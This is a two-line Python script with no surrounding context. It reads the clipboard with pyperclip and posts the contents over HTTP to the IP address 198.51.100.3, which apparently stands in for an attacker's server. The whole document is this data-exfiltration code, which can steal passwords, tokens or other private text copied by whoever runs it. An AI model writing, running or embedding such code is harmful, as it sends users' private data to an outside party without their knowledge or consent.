import pyperclip, requests
requests.post('http://198.51.100.3', data=pyperclip.paste())
